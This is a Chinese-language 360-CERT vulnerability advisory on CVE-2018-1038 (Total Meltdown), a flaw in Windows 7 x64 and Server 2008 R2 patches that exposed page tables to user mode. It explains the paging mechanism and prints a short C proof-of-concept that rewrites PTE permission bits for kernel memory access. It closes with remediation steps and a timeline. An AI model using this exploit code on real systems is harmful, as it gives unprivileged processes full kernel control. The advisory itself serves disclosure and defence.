# CVE-2018-1038: 微软TotalMeltdown漏洞分析预警

阅读量 **130091**

发布时间 : 2018-03-31 10:19:18

 **x**

##### 译文声明

本文是翻译文章，文章原作者 360cert，文章来源：https://cert.360.cn

原文地址：[https://cert.360.cn/warning/detail?id=b58c185c339521ee4e31674d36cd36e3&from=groupmessage&isappinstalled=0](https://cert.360.cn/warning/detail?id=b58c185c339521ee4e31674d36cd36e3&from=groupmessage&isappinstalled=0)

译文仅供参考，具体内容表达以及含义原文为准。

报告编号： B6-2018-033001

报告来源： 360-CERT

报告作者： 360-CERT，360安全卫士

更新日期： 2018-03-30

## 0x00 漏洞概述

近日，微软2018年1月和2月的Windows7 x64 和 Windows Server 2008 R2安全补丁中被发现存在严重漏洞(Total
Meltdown)，补丁中错误地将PML4权限设定成用户级，导致任意用户态进程可对系统内核进行任意读写。

360-CERT对此漏洞进行了相关的分析，建议相关受影响用户可以通过360安全卫士进行补丁升级。

## 0x01 漏洞影响面

漏洞危害等级：高危

漏洞编号：CVE-2018-1038

影响版本：

Windows 7 x64

Windows Server 2008 R2

## 0x02 x64分页原理

Intel X64使用的是四级分页模式：PML4(Page Map Level 4)，PDPT(Page Directory
Pointer)，PD(Page Directory)，PT(Page Table Entry)。

![](https://p2.ssl.qhimg.com/t01f37d58699e667421.png)

每张表有512个条目，所以理论上64位CPU可以寻址512*512*512*512*4KB=256TB的内存，但是由于48位物理地址的限制，实际上有效的虚拟地址属于下面这两个范围：0至7FFF’FFFFFFFF(512GB*256)或FFFF8000’00000000至FFFFFFFF’FFFFFFFF(512GB*256)。

微软采取了一种称为self-ref
entry(自引用条目)的技术，在最高级别的页表中有一个条目指向自己。在64位系统中，任意自引用条目使用的物理地址应该指向PML4基地址的物理地址，与CR3寄存器所指向的地址相同。

## 0x03 漏洞细节

在Windows7 x64和Windows Server 2008
R2中，系统将PML4表中0x1ED这个固定位置存放指向自己的入口，对应的虚拟地址计算如下：

    
    
    viraddr
    =0xFFFF000000000000+(0x1ed<<12)+(0x1ed<<21)+ (0x1ed<<30)+ (0x1ed<<39)
    =0xFFFFF6FB7DBED000
    

而安装完1月和2月安全更新后系统将虚拟地址0xFFFFF6FB7DBED000指向的内存权限错误地设置为用户态可读，漏洞原理如下。 四级分页结构:
PML4、PDPT、PD、PT

由于PML4自引用的权限位为可读可写

所以利用自引用，黑客可以任意修改PML4、PDPT、PD、PT中的任意数据

正常虚拟地址到物理地址的映射:

PML4—–PDPT—–PD——-PT—-PAGE—–PAddr

利用自引用访问受保护的数据:

第一步修改页保护位(假设地址对应的PML4、PDPT、PD、PT对该用户来说都是可读可写，如果不，原理跟此一样)，首先想办法获得与该页对应的PTE(利用自引用)地址：

方法: PML4—–PML4—-PDPT——PD—–PT——-PTE

修改保护位为可读可写。

第二步：直接修改数据(由于第一步已经修改权限位，所以不会引发异常)

证明代码如下：

    
    
    #include 
    #include
    #include 
    
    #define QWORD unsigned long long
    
    #define BASE 0xFFFF000000000000
    
    #define PML4 0xFFFFF6FB7DBED000
    
    #define PML4SELF_IDX 0x1ed
    
    QWORD getAddr(QWORD base,QWORD pml4Idx,QWORD pdptIdx,QWORD pdIdx,QWORD ptIdx,QWORD offsetIdx);
    
    
    void testAddr(unsigned char *p);
    
    int main(int argc, char *argv)
    {
        unsigned char *p = (unsigned char*)getAddr(BASE, PML4SELF_IDX, PML4SELF_IDX, PML4SELF_IDX, 1, 0);//到达PDPT
    
        testAddr(p);
    
        QWORD *pte = (QWORD *)getAddr(BASE, PML4SELF_IDX, PML4SELF_IDX, PML4SELF_IDX, PML4SELF_IDX, 8);
        printf("%ulld\n", *pte);
        *pte = (*pte | 7);
    
        testAddr(p);
    
        return 0;
    }
    
    
    QWORD getAddr(QWORD base, QWORD pml4Idx, QWORD pdptIdx, QWORD pdIdx, QWORD ptIdx, QWORD offsetIdx) {
        return base = base + offsetIdx + (ptIdx<<12) + (pdIdx<<21) + (pdptIdx<<30) + (pml4Idx<<39);
    }
    
    void testAddr(unsigned char *p) {
        __try {
            int i = *p;
            printf("access 0x%p sucess\n", p);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("access 0x%p error\n", p);
        }
    }
    

![](https://p1.ssl.qhimg.com/t017f3dd8cdd83f85eb.png)

## 0x04 pcileech工具原理

漏洞作者根据漏洞原理将内存读取工具pcileech更新到了3.2版本使得其能够利用该漏洞。

![](https://p403.ssl.qhimgs4.com/t01b8752a0130afa3a0.png)

通过在0x10000和0x2f000之间插入32页来设置页表结构。0x10000页面将作为PDPT。0x10000到0x2e000之间的另外31页将作为PD，其将映射2MB页的物理内存。使用当前算法这将允许映射最大31*512*2MB=31744MB的物理地址空间，大约30GB。

## 0x05 修复建议

1.使用360安全卫士扫描系统漏洞并修复

![](https://p5.ssl.qhimg.com/t0128e9128af9365ee7.jpg)

2.下载专用检测工具：<http://down.360safe.com/totalmeltdown_fix.exe>

![](https://p2.ssl.qhimg.com/t012bd21bffa7669948.png)

## 0x06 时间线

**2018-01-03** 微软官方发布安全更新（KB4056897）

**2018-02-13** 微软官方发布安全更新（KB4074587）

**2018-03-13** 微软官方发布安全更新（KB4088878），360安全卫士推送相关补丁

**2018-03-27** TotalMeltdown漏洞细节被公开

**2018-03-30** 360-CERT发布漏洞预警分析报告

**2018-03-30** 360安全卫士发布独立修复工具

## 0x07 参考链接

  1. <https://blog.frizk.net/2018/03/total-meltdown.html>
  2. <https://www.coresecurity.com/blog/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-1>
  3. <https://www.coresecurity.com/blog/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows>
  4. <https://github.com/ufrisk/pcileech>

本文翻译自https://cert.360.cn
[原文链接](https://cert.360.cn/warning/detail?id=b58c185c339521ee4e31674d36cd36e3&from=groupmessage&isappinstalled=0)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CERT安全通告** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/103324](/post/id/103324)

安全客 - 有思想的安全新媒体

本文转载自:
[https://cert.360.cn](https://cert.360.cn/warning/detail?id=b58c185c339521ee4e31674d36cd36e3&from=groupmessage&isappinstalled=0)

如若转载,请注明出处：
[https://cert.360.cn/warning/detail?id=b58c185c339521ee4e31674d36cd36e3&from=groupmessage&isappinstalled=0](https://cert.360.cn/warning/detail?id=b58c185c339521ee4e31674d36cd36e3&from=groupmessage&isappinstalled=0)

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [漏洞预警](/tag/漏洞预警)
  * [CVE-2018-1038](/tag/CVE-2018-1038)
  * [裂谷漏洞](/tag/裂谷漏洞)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t013be54b59d8ac5fe6.jpg)
360CERT安全通告

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

